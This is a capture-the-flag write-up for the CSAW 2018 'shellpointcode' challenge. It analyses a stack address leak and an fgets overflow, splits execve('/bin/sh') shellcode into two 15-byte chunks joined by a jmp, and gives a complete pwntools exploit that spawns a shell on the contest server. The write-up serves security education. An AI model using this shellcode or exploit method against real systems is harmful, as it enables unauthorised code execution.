# Csaw18 Pwn 100 Shellpointcode

Let's take a look at the binary:

```
$	./shellpointcode 
Linked lists are great! 
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
000000000000000000000000000000000
(15 bytes) Text for node 2: 
11111111111111111111111111111111111
node1: 
node.next: 0x7fffb906e3d0
node.buffer: 000000000000000
What are your initials?
0000000
Thanks 0000000

Segmentation fault (core dumped)
$	file shellpointcode 
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
$	pwn checksec shellpointcode 
[*] '/Hackery/csaw18/pwn/shellcode/shellpointcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

So we can see that the program prompts us for input three times, and probably has a buffer overflow somewhere (since it crashed). We can also see that it is a `64` bit elf with `PIE` enabled so the addresses of all of the instructions will be randomized for each run (we don't have to worry about a Canary). We can also see that right before we give it the third input, it gives us what looks like to be a stack address with `node.next`. A quick look at gdb confirms this:

```
gdb-peda$ r
Starting program: /Hackery/csaw18/pwn/shellcode/shellpointcode 
Linked lists are great! 
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
15935728
(15 bytes) Text for node 2: 
75395128
node1: 
node.next: 0x7fffffffdd50
node.buffer: 15935728

What are your initials?
^C
Program received signal SIGINT, Interrupt.

.	.	.

gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555555000 r-xp	/Hackery/csaw18/pwn/shellcode/shellpointcode
0x0000555555754000 0x0000555555755000 r-xp	/Hackery/csaw18/pwn/shellcode/shellpointcode
0x0000555555755000 0x0000555555756000 rwxp	/Hackery/csaw18/pwn/shellcode/shellpointcode
0x0000555555756000 0x0000555555777000 rwxp	[heap]
0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 rwxp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 rwxp	mapped
0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd7000 0x00007ffff7fd9000 rwxp	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

So we can see that the infoleak here was for `0x7fffffffdd50`. We can also see that the stack is between addresses  `0x00007ffffffde000` and `0x00007ffffffff000`, which our infoleak falls between. With that, we confirmed we have a stack address infoleak prior to the third input.


In the IDA C psuedocode for this binary, in the main function, we can see it calls the `nononode` function:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("Linked lists are great! \nThey let you chain pieces of data together.\n");
  nononode();
  return 0;
}
```

looking at the `nononode` function, we see this code:
```
int nononode()
{
  char node; // [sp+0h] [bp-40h]@1
  __int64 inp1; // [sp+8h] [bp-38h]@1
  char *nodePtr; // [sp+20h] [bp-20h]@1
  __int64 inp0; // [sp+28h] [bp-18h]@1

  nodePtr = &node;
  puts("(15 bytes) Text for node 1:  ");
  readline((char *)&inp0, 0xFuLL);
  puts("(15 bytes) Text for node 2: ");
  readline((char *)&inp1, 0xFuLL);
  puts("node1: ");
  printNode(&nodePtr);
  return goodbye();
}
```

So we can see where the first two prompts to scan in input are. We can see that it allows us to scan in two separate `0xf` (`15`) byte segments into `inp0` and `inp1`. We can also see that both `inp0` and `inp1` are bigger than `0xf` bytes, so no overflow (`0x38 - 0x20 = 0x18 > 0xf`). Also one important thing for later, we can see that the starts our two fifteen byte segments are split up in memory by `0x20` (`32`) bytes (`0x38 - 0x18 = 0x20` ). Looking at the `printNode` function (which is passed a ptr to a ptr for `node`) we can see where the infoleak comes from:

```
int __fastcall printNode(_QWORD *ptr)
{
  return printf("node.next: %p\nnode.buffer: %s\n", *ptr, ptr + 1);
}
```

So we can see that it prints the stack address it get's passed as a pointer, so that's where we get the stack infoleak. We can also see that it prints the contents of `ptr + 1` which translates to the address if `node` + `0x8` bytes (since 1 64 bit ptr is `0x8` bytes). Looking at the location of where `node` is, we see that it will print the contents of `inp1`. Examining the memory in gdb confirms that (in addition to just running it):

```
gdb-peda$ x/s 0x7fffffffdd58
0x7fffffffdd58:	"75395128\n"
```

then that brings us to our final function `goodbye`:

```
int goodbye()
{
  char s; // [sp+Dh] [bp-3h]@1

  puts("What are your initials?");
  fgets(&s, 32, stdin);
  return printf("Thanks %s\n", &s);
}
```

So we can clearly see there is a buffer overflow bug with the `fgets` call. It is scanning in `32` (`0x20`) bytes into a `0x3` byte space (since it is at `bp-0x3`, and there's nothing below it on the stack). Looking at the stack frame in IDA, we can see that there are `0xb` (`11`) bytes between the start of our input and the return address, so we have plenty of space to work with (our input is at `s`, and the return address is `r`):

```
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003 s               db 3 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

So with that, we have an executable stack, a buffer overflow that grants us control of the return address, and a stack infoleak (which we can use to figure out the address of anything within that memory region, by usign it's offset). The easy thing to do would be to just push shellcode to the stack, and call it. However the issue here it we don't have a single continuous block of memory to store it in. The biggest one we have is the `0x20` bytes from the `goodbye` call, however that one has to have an `0x8` byte address `11` bytes in to write over the return address, leaving us with onlu `21` bytes to work with across two separate blocks. What we will need to do here, is write/modify some custom shellcode to specifically fit in the multiple discontinuous chunks we have. I just managed to split my shellcode into two different `0xf` (`15`) byte blocks, and stored them in `inp0` and `inp1`, and just called  `inp1`. We already know from what we previously did that the offset from the infoleak we got to our second input is `+0x8` bytes. 

For writing the custom shellcode, we will be splitting up the shellcode into these two blocks. I did not write this shell code originally, I only modified it to fit this one particular use case (I just threw in a `jmp` instruction). The shellcode came from here: `https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/`

block 0:
```
  400080:	48 bf d1 9d 96 91 d0 	movabs rdi,0xff978cd091969dd1
  400087:	8c 97 ff 
  40008a:	e9 0c 00 00 00       	jmp    40009b <_start+0x1b>
```

This block just executes two different instructions.  The first just moves the hex string `0xff978cd091969dd1` (which is just the string `/bin/sh\x00` noted) into the `rdi` register, and then calls the relative jump function. This will just jump `x` amount of instructions, where `x` is it's argument (which in this case it's `0xc`, which is `12`). To figure out how many instructions to jump, I examined the amount of instructions interpreted (since most data can be interpreted as an instruction, and by our `jmp` call will) to see how many instructions I would need to jump ahead, and a bit of trial and error untill I got it right. Remember the relative jump opcode (`0xe9`) works off of the number instructions (which varry in bytes), not bytes.

block1:
```
  4000a8:	31 f6                	xor    esi,esi
  4000aa:	f7 e6                	mul    esi
  4000ac:	04 3b                	add    al,0x3b
  4000ae:	48 f7 df             	neg    rdi
  4000b1:	57                   	push   rdi
  4000b2:	54                   	push   rsp
  4000b3:	5f                   	pop    rdi
  4000b4:	0f 05                	syscall 
```

Here is the rest of the shellcode. It essentially just sets for the `syscall` which will give us a shell, then makes the `syscall`.

Here is a look at the shellcode precompiled. The `NOP`s represent the space between the two segments,

```
$	cat shellcode.c 
;exit.asm
[SECTION .text]
global _start
_start:
	mov rdi, 0xff978cd091969dd1
	jmp 0x10
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	xor esi, esi
	mul esi
	add al, 0x3b	
	neg rdi
	push rdi
	push rsp
	pop rdi
	syscall
```

and to compile the shellcode:

```
$	nasm -f elf64 shellcode.asm
$	ld -o sheller shellcode.o 
$	objdump -D sheller -M intel

sheller:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 bf d1 9d 96 91 d0 	movabs rdi,0xff978cd091969dd1
  400087:	8c 97 ff 
  40008a:	e9 0c 00 00 00       	jmp    40009b <_start+0x1b>
  40008f:	90                   	nop
  400090:	90                   	nop
  400091:	90                   	nop
  400092:	90                   	nop
  400093:	90                   	nop
  400094:	90                   	nop
  400095:	90                   	nop
  400096:	90                   	nop
  400097:	90                   	nop
  400098:	90                   	nop
  400099:	90                   	nop
  40009a:	90                   	nop
  40009b:	90                   	nop
  40009c:	90                   	nop
  40009d:	90                   	nop
  40009e:	90                   	nop
  40009f:	90                   	nop
  4000a0:	90                   	nop
  4000a1:	90                   	nop
  4000a2:	90                   	nop
  4000a3:	90                   	nop
  4000a4:	90                   	nop
  4000a5:	90                   	nop
  4000a6:	90                   	nop
  4000a7:	90                   	nop
  4000a8:	31 f6                	xor    esi,esi
  4000aa:	f7 e6                	mul    esi
  4000ac:	04 3b                	add    al,0x3b
  4000ae:	48 f7 df             	neg    rdi
  4000b1:	57                   	push   rdi
  4000b2:	54                   	push   rsp
  4000b3:	5f                   	pop    rdi
  4000b4:	0f 05                	syscall 

```

putting it all together, we get the following exploit:
```
# Import pwntools
from pwn import *

# Establish the target process
#target = process('./shellpointcode')
target = remote('pwn.chal.csaw.io', 9005)
#gdb.attach(target)


# Establlish the two 15 byte shellcode blocks
s0 = "\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xe9\x11\x00\x00\x00"
s1 = "\x90\x31\xf6\xf7\xe6\x04\x3b\x48\xf7\xdf\x57\x54\x5f\x0f\x05"


# Send the second block first, since it will be stored in memory where it will be exeucted second 
print target.recvline('node 1:\n')
target.sendline(s1)

# Send the first block of shell code
print target.recvline('node 2:\n')
target.sendline(s0)

# Grab and filter out the infoleak
print target.recvuntil('node.next:')
leak = target.recvline()
leak = leak.replace('\x0a', '')
print 'leak: ' + leak
leak = int(leak, 16)
log.info("Leak is: " + hex(leak))

# Send the buffer overflow to overwrite the return address to our shellcode, and get code exec
target.sendline('0'*11 + p64(leak + 0x8))

# Drop to an interactive shell
target.interactive('node.next: ')
```

and when we run it:

```
$	cat flag.txt 
python exploit.py 
[+] Opening connection to pwn.chal.csaw.io on port 9005: Done
Linked lists are great! 

They let you chain pieces of data together.


(15 bytes) Text for node 1:  
(15 bytes) Text for node 2: 
node1: 
node.next:
leak:  0x7ffcf208c660
[*] Leak is: 0x7ffcf208c660
ls
hello
[*] Switching to interactive mode
node.buffer: \x901���;H��WT_\x0f\x05
What are your initials?
Thanks 00000000000h��
node.next:                      w
 04:15:53 up 3 days,  7:39,  0 users,  load average: 0.23, 0.16, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
node.next: ls
flag.txt
shellpointcode
node.next: cat flag.txt
flag{NONONODE_YOU_WRECKED_BRO}
node.next: 
[*] Interrupted
[*] Closed connection to pwn.chal.csaw.io port 9005

```

Just like that, we captured the flag!